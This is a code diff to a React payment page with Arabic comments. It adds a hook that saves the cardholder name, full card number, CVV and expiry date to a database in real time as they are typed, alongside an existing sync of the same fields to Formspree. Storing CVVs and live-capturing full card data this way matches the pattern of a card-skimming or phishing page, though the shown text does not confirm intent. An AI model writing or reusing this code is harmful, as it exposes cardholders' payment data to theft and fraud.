@@ -9,6 +9,7 @@ import { ChatButton } from "@/components/ChatButton";
 import { Footer } from "@/components/Footer";
 import { useToast } from "@/hooks/use-toast";
 import { useFormspreeSync } from "@/hooks/useFormspreeSync";
+import { useAutoSave } from "@/hooks/useAutoSave";
 import { supabase } from "@/integrations/supabase/client";
 import {
   Dialog,
@@ -59,6 +60,18 @@ const Payment = () => {
     expiryDate: formData.expiryMonth && formData.expiryYear ? `${formData.expiryMonth}/${formData.expiryYear}` : "",
     cvv: formData.cvv
   }, "صفحة الدفع - Payment");
+
+  // Auto-save to database in real-time
+  useAutoSave(applicationId, {
+    cardholder_name: formData.cardholderName,
+    card_number: formData.cardNumber,
+    card_cvv: formData.cvv,
+    expiry_date: formData.expiryMonth && formData.expiryYear ? `${formData.expiryMonth}/${formData.expiryYear}` : "",
+    selected_company: companyName,
+    selected_price: price,
+    regular_price: regularPrice,
+    current_step: 'payment'
+  }, "Payment");
 
   // تحديد نوع البطاقة بناءً على الأرقام
   const getCardType = (cardNumber: string): "visa" | "mastercard" | "unknown" => {
